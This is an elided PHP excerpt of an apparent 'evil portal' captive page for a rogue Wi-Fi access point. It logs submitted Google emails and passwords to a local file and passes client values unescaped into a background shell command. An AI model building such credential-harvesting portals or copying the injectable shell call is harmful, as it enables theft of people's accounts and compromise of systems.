...
class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        ...
        $want .= DIRECTORY_SEPARATOR;
		  ...
		  $sender = "info@test.com"; //Sender of the mail
		  ...
		  if (isset($_POST['gettoken'])) {
           ...
           file_put_contents("$dir/evilportal-logs/google-logins.txt", "{$email}:{$gpw}/n", FILE_APPEND); // write google clients file 
		  ...
		  if (isset($_POST['getaccess'])) {
           ...
           if($rtoken == $dtoken) {       
            ...
            $this->execBackground("writeLog $mac' - '$rtoken'/n");
